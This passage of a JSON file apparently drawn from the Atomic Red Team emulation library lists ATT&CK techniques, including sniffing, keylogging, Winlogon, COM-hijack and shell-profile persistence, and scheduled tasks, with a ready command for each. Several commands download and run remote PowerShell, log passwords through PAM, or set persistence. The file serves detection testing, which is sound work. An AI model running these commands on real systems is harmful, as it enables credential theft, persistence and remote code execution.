         "description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n",
         "command": "sudo /tmp/t1040_macos_pcapdemo -i en0 -t 3"
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
         "description": "Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.\nSOCK_PACKET is \"obsolete\" according to the man page, but still works on Ubuntu 20.04\n",
         "command": "sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3"
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
         "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n",
         "command": "tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33"
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
         "description": "Captures packets with domain=AF_PACKET,type=SOCK_RAW for a few seconds.\nSets a BPF filter on the socket to filter for UDP traffic.\n",
         "command": "sudo /tmp/t1040_linux_pcapdemo -a -f -t 3"
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
         "description": "Captures packets with domain=AF_INET,type=SOCK_RAW,protocol=TCP for a few seconds.\n",
         "command": "sudo /tmp/t1040_linux_pcapdemo -4 -p 6 -t 3"
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
         "description": "Will start a packet capture and store log file as t1040.etl.\nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
         "command": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl && TIMEOUT /T 5 >nul 2>&1 && pktmon.exe stop"
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
         "description": "Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.\n",
         "command": "sudo tcpdump -c 5 -nnni en0A    ; if [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i en0A; fi; "
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
         "description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory",
         "command": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10"
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
         "description": "Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few seconds.\n",
         "command": "sudo /tmp/t1040_linux_pcapdemo -a -t 3"
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
         "description": "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
         "command": "pktmon.exe filter add -p 445"
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "multiple",
         "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n",
         "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet -c 5"
      },
      {
         "technique_id": "T1040",
         "technique_name": "Network Sniffing",
         "tactic": "credential-access",
         "description": "Perform a packet capture",
         "command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";\nNew-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n};\n"
      }
   ],
   "T1547.007": [
      {
         "technique_id": "T1547.007",
         "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications",
         "tactic": "multiple",
         "description": "Copy in new loginwindow.plist to launch Calculator.\n",
         "command": "cp b1d66c_reopen_loginwindow_calc.plist ~/Library/Preferences/ByHost/com.apple.loginwindow.plist"
      },
      {
         "technique_id": "T1547.007",
         "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications",
         "tactic": "multiple",
         "description": "Appends an entry to launch Calculator hidden loginwindow.*.plist for next login.\nNote that the change may not result in the added Calculator program launching on next user login.\nIt may depend on which version of macOS you are running on.\n",
         "command": "FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`; if [ -z \"${FILE}\" ] ; then echo \"No loginwindow plist file found\" && exit 1 ; fi; echo save backup copy to /tmp/; cp ${FILE} /tmp/t1547007_loginwindow-backup.plist; echo before; plutil -p ${FILE}; echo overwriting...; /tmp/t1547007_append_exe ${FILE} && echo after && plutil -p ${FILE}"
      },
      {
         "technique_id": "T1547.007",
         "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications",
         "tactic": "multiple",
         "description": "Mac Defaults\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n",
         "command": "sudo defaults write com.apple.loginwindow LoginHook /path/to/script"
      }
   ],
   "T1547.015": [
      {
         "technique_id": "T1547.015",
         "technique_name": "Boot or Logon Autostart Execution: Login Items",
         "tactic": "multiple",
         "description": "Runs osascript on a file to create new LoginItem for current user.\nNOTE: Will popup dialog prompting user to Allow or Deny Terminal.app to control \"System Events\"\nTherefore, it can't be automated until the TCC is granted.\nThe login item launches Safari.app when user logs in, but there is a cleanup script to remove it as well.\nIn addition to the `osascript` Process Events, file modification events to\n`/Users/*/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm` should be seen.\n",
         "command": "osascript 998e96_add_login_item.osa"
      },
      {
         "technique_id": "T1547.015",
         "technique_name": "Boot or Logon Autostart Execution: Login Items",
         "tactic": "multiple",
         "description": "Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)",
         "command": "mv ~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json ~\\AppData\\Local\\Temp\\settings.json; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true\" -OutFile \"~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json\"; wt.exe"
      }
   ],
   "T1056.001": [
      {
         "technique_id": "T1056.001",
         "technique_name": "Input Capture: Keylogging",
         "tactic": "multiple",
         "description": "The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n",
         "command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS ; auditctl -a always,exit -F arch=b32 -S execve -k CMDS; whoami; ausearch -i --start $(date +\"%d/%m/%y %H:%M:%S\")"
      },
      {
         "technique_id": "T1056.001",
         "technique_name": "Input Capture: Keylogging",
         "tactic": "multiple",
         "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n",
         "command": "if (Test-Path \"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\") { ; } else {New-Item -ItemType Directory (Split-Path \"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\") -Force | Out-Null; Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile \"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\"};  ;  &\"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\" -LogPath $env:TEMP\\key.log"
      },
      {
         "technique_id": "T1056.001",
         "technique_name": "Input Capture: Keylogging",
         "tactic": "multiple",
         "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
         "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> /tmp/.keyboard.log' DEBUG; echo \"Hello World!\"; cat /tmp/.keyboard.log"
      },
      {
         "technique_id": "T1056.001",
         "technique_name": "Input Capture: Keylogging",
         "tactic": "multiple",
         "description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n",
         "command": "cp -v /etc/pam.d/sshd /tmp/; echo \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd; systemctl restart sshd; systemctl restart auditd; ssh ubuntu@localhost ; whoami; sudo su; whoami; exit; exit"
      },
      {
         "technique_id": "T1056.001",
         "technique_name": "Input Capture: Keylogging",
         "tactic": "multiple",
         "description": "Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n",
         "command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk; sudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so; enable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so; enable=* log_password\" >> /etc/pam.d/system-auth"
      },
      {
         "technique_id": "T1056.001",
         "technique_name": "Input Capture: Keylogging",
         "tactic": "multiple",
         "description": "Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.\nInput Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.\nReferece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74\n",
         "command": "swift 8495c4_MacOSKeylogger.swift -keylog"
      },
      {
         "technique_id": "T1056.001",
         "technique_name": "Input Capture: Keylogging",
         "tactic": "multiple",
         "description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
         "command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'; echo \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"; tail /var/log/syslog"
      }
   ],
   "T1055.011": [
      {
         "technique_id": "T1055.011",
         "technique_name": "Process Injection: Extra Window Memory Injection",
         "tactic": "multiple",
         "description": "Hooks functions of main process to inject a payload via Extra Window Memory (EWM) injection technique",
         "command": "C:\\Users\\puma-4\\Desktop\\4a3cbc_T1055.011_x64.exe"
      }
   ],
   "T1547.004": [
      {
         "technique_id": "T1547.004",
         "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
         "tactic": "multiple",
         "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
         "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
      },
      {
         "technique_id": "T1547.004",
         "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
         "tactic": "multiple",
         "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
         "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
      },
      {
         "technique_id": "T1547.004",
         "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
         "tactic": "multiple",
         "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.\n\nPlease note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.\n",
         "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Type ExpandString -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"AtomicTestFunction\" -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force"
      },
      {
         "technique_id": "T1547.004",
         "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
         "tactic": "multiple",
         "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
         "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
      },
      {
         "technique_id": "T1547.004",
         "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
         "tactic": "multiple",
         "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
         "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force"
      }
   ],
   "T1546.004": [
      {
         "technique_id": "T1546.004",
         "technique_name": "Event Triggered Execution: .bash_profile and .bashrc",
         "tactic": "multiple",
         "description": "An adversary may wish to establish persistence by executing malicious commands from the systems /etc/profile every time \"any\" user logs in.\n",
         "command": "echo '# Hello from Atomic Red Team T1546.004' >> /etc/profile"
      },
      {
         "technique_id": "T1546.004",
         "technique_name": "Event Triggered Execution: .bash_profile and .bashrc",
         "tactic": "multiple",
         "description": "The Bash shell runs ~/.bash_logout \"if it exists\" to run commands on user logout. An adversary may create or append to a .bash_logout to clear history, start processes etc. Note the ~/.bash_logout is only run if you explicitly exit or log out of an \"interactive login shell session\" i.e. via the console, SSH, /bin/bash -l or su -l <username>. \n\nThis test creates the art user, logs in, creates a .bash_logout which will echo some text into the art.txt file on logout and logs out and the /home/art/art.txt is created.\n",
         "command": "useradd --create-home --shell /bin/bash art; su --login art; echo 'echo \"Atomic Red Team was here... T1546.004\" >> $HOME/art.txt' >> $HOME/.bash_logout"
      },
      {
         "technique_id": "T1546.004",
         "technique_name": "Event Triggered Execution: .bash_profile and .bashrc",
         "tactic": "multiple",
         "description": "Adds a command to the .bashrc file of the current user\n",
         "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bashrc"
      },
      {
         "technique_id": "T1546.004",
         "technique_name": "Event Triggered Execution: .bash_profile and .bashrc",
         "tactic": "multiple",
         "description": "An adversary may wish to establish persistence by adding commands into any of the script files in the /etc/profile.d/ directory, which are executed every time \"any\" user logs in.\n",
         "command": "echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh"
      },
      {
         "technique_id": "T1546.004",
         "technique_name": "Event Triggered Execution: .bash_profile and .bashrc",
         "tactic": "multiple",
         "description": "An adversary may wish to establish persistence by executing malicious commands from the users ~/.profile every time the \"user\" logs in.\n",
         "command": "echo '# Atomic Red Team was here... T1546.004' >> ~/.profile"
      },
      {
         "technique_id": "T1546.004",
         "technique_name": "Event Triggered Execution: .bash_profile and .bashrc",
         "tactic": "multiple",
         "description": "Adds a command to the .bash_profile file of the current user\n",
         "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bash_profile"
      }
   ],
   "T1546.015": [
      {
         "technique_id": "T1546.015",
         "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
         "tactic": "multiple",
         "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/",
         "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'; New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Value \"PathToAtomicsFolder\\..\\ExternalPayloads\\AtomicTest.dll\"; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -PropertyType \"String\"; Start-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'"
      },
      {
         "technique_id": "T1546.015",
         "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
         "tactic": "multiple",
         "description": "Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/",
         "command": "$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\")); $item = $o.Item(); $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)"
      },
      {
         "technique_id": "T1546.015",
         "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
         "tactic": "multiple",
         "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. ",
         "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'; New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dll_path}\"; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"; Start-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver #{clsid}'"
      },
      {
         "technique_id": "T1546.015",
         "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
         "tactic": "multiple",
         "description": "This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.\nThen, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The\ntest is validated by running 'rundll32.exe -sta \"AtomicTest\"' to avoid logging out.\n\nReferences:\n\nhttps://youtu.be/3gz1QmiMhss?t=1251\n\nhttps://github.com/enigma0x3/windows-operating-system-archaeology",
         "command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /d \"C:\\WINDOWS\\system32\\scrobj.dll\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /d \"Apartment\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /d \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; rundll32.exe -sta \"AtomicTest\""
      }
   ],
   "T1053.005": [
      {
         "technique_id": "T1053.005",
         "technique_name": "Scheduled Task/Job: Scheduled Task",
         "tactic": "multiple",
         "description": "Create a task on a remote system.\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n",
         "command": "SCHTASKS /Create /S localhost /RU DOMAIN\\user /RP At0micStrong /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST 20:10"
      },
      {
         "technique_id": "T1053.005",
         "technique_name": "Scheduled Task/Job: Scheduled Task",
         "tactic": "multiple",
         "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n",
         "command": "$xml = [System.IO.File]::ReadAllText(\"2cc1c4_T1053_005_WMI.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }"
      },
      {
         "technique_id": "T1053.005",
         "technique_name": "Scheduled Task/Job: Scheduled Task",
         "tactic": "multiple",
         "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
         "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10"
      },
      {
         "technique_id": "T1053.005",
         "technique_name": "Scheduled Task/Job: Scheduled Task",
         "tactic": "multiple",
         "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n",
         "command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f && schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45"
      },
      {
         "technique_id": "T1053.005",
         "technique_name": "Scheduled Task/Job: Scheduled Task",
         "tactic": "multiple",
         "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
         "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTask -InputObject $object"
      },
      {
         "technique_id": "T1053.005",
         "technique_name": "Scheduled Task/Job: Scheduled Task",
         "tactic": "multiple",
         "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n",
         "command": "$xml = [System.IO.File]::ReadAllText(\"54d4ab_T1053_05_SCTASK_HIDDEN_ATTRIB.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }"
      },
      {
         "technique_id": "T1053.005",
         "technique_name": "Scheduled Task/Job: Scheduled Task",
         "tactic": "multiple",
         "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\""
      },
      {
         "technique_id": "T1053.005",
         "technique_name": "Scheduled Task/Job: Scheduled Task",
         "tactic": "multiple",
         "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n",
         "command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\" && schtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\""
      },
      {
         "technique_id": "T1053.005",
         "technique_name": "Scheduled Task/Job: Scheduled Task",
         "tactic": "multiple",
         "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n",
         "command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed -InputObject $object; $NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"; Set-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction"
      }
   ],
   "T1055.002": [
      {
         "technique_id": "T1055.002",
         "technique_name": "Process Injection: Portable Executable Injection",
         "tactic": "multiple",
         "description": "This test injects a portable executable into a remote Notepad process memory using Portable Executable Injection and base-address relocation techniques. When successful, a message box will appear with the title \"Warning\" and the content \"Atomic Red Team\" after a few seconds.",
